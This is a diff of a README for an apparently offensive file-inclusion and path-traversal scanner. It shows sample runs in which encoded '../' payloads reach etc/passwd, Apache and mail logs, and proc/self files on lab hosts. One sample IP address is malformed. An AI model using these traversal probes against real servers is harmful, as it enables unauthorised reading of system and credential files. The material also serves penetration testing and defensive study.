@@ -44,12 +44,10 @@ root@case:/#./fi-cyberspace-scan.py -t http://127.0.0.1/cyber.php?= -m kuang-gra
 -----------------------------------------------------------------
 ```
 
-Here is a sample output for the ICE-Breaker mode, which tests a few basic directories using a variety of long encoded paths. In this case a valid hit on etc/password found in the root **/** and 4 directories deep **../../../../** encoded and not encoded.
-
-With this info, we can use other cyber-attack modes, setting path type to **../** or to other valid encoded path types.
+Here is a sample output for the [Kuang-Grade-Mark-11](http://www.antonraubenweiss.com/gibson/history/v1/glossary.html) mode, which tests a large directory list. In this case there are valid hits in the root **/** and 4 directories deep **../../../../**. You could initally run the **ICE-Breaker** to verify valid path types.
 
 ```
-root@kali:/home/scripts# python ok.py -t http://172.28.1227.5/cyber.php?space= -m 1
+root@kali:/home/scripts# python fi-cyberspace-scan.py -t http://172.28.1227.5/cyber.php?space= -m 3
 -----------------------------------------------------------------
 '___ *  .    '   \|/     *   .   '      + .----. .  '  -*-    
 |===|     ' __   -*-  FI Cyberspace-Scan  ||'''|_       ' ___ 
@@ -57,37 +55,43 @@ root@kali:/home/scripts# python ok.py -t http://172.28.1227.5/cyber.php?space= -
 |= =|::| |.|:|==|____|= =| .   ____|==| |::|= =|.|__ '|::|= =|
 |=|=|::|_|.|:|==| :: |_.-`-.__|----|==|_|::|=|=|.|::|_|::|= =|
 -----------------------Hardwired Options-------------------------
-TARGET URL                   : http://172.28.1227.5/cyber.php?space=
-CYBER ATTACK MODE            : ICE-Breaker
-PATH TYPE                    : Custom Encoded
+TARGET URL                   : http://172.28.128.3/turing-bolo/bolo.php?bolo=
+CYBER ATTACK MODE            : Kuang-Grade-Mark-11
+PATH TYPE                    : ../
 DEEP SPACE TRAVERSAL         : False
 NULL-BYTE %00                : False
 -----------------------------------------------------------------
 DO NOT USE AGAINST UNAUTHORIZED INTRUSION COUNTERMEASURES ELECTRONICS
-Execute Cyberspace Run? [Y/n]: Y
+Execute Cyberspace Run? [Y/n]: 
 
 -----------------------------------------------------------------
 It seems  448  is the common reflected byte size.
 Digging into unique reflection sizes.
 -----------------------------------------------------------------
-[+] - Something interesting found with etc/passwd in 
-     --Path:  / bytes: 2161
-     --Path:  ../../../../ bytes: 2161
-     --Path:  %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f bytes: 2161
-     --Path:  %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f bytes: 2161
-     --Path:  %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f bytes: 2161
-     --Path:  %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f bytes: 2161
-     --Path:  %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f bytes: 2161
-     --Path:  %2e%2e/%2e%2e/%2e%2e/%2e%2e/ bytes: 2161
-     --Path:  %2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/ bytes: 2161
-     --Path:  %2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/ bytes: 2161
-     --Path:  %2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/ bytes: 2161
-     --Path:  %2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/ bytes: 2161
-     --Path:  ..%2f..%2f..%2f..%2f bytes: 2161
-     --Path:  ..%2f..%2f..%2f..%2f..%2f bytes: 2161
-     --Path:  ..%2f..%2f..%2f..%2f..%2f..%2f bytes: 2161
-     --Path:  ..%2f..%2f..%2f..%2f..%2f..%2f..%2f bytes: 2161
-     --Path:  ..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f bytes: 2161
-[-] - Nothing found in etc/passwd%00
+[+] - Something interesting found with /var/log/messages in 
+     --Path:  /
+     --Path:  ../../../../
+[+] - Something interesting found with var/log/mail.log in 
+     --Path:  /
+     --Path:  ../../../../
+[-] - Nothing found in var/log/maillog
+[+] - Something interesting found with var/log/apache2/access.log in 
+     --Path:  /
+     --Path:  ../../../../
+[-] - Nothing found in var/log/postgresql/postgresql-10-main.log
+[+] - Something interesting found with var/log/apache2/error.log in 
+     --Path:  /
+     --Path:  ../../../../
+[-] - Nothing found in var/log/httpd/access_log
+[-] - Nothing found in var/log/httpd/error.log
+[+] - Something interesting found with proc/self/cmdline in 
+     --Path:  /
+     --Path:  ../../../../
+[+] - Something interesting found with proc/self/stat in 
+     --Path:  /
+     --Path:  ../../../../
+[-] - Nothing found in var/log/apache2/error_log
+[-] - Nothing found in var/log/httpd/access.log
+
 ---snip---
 ```
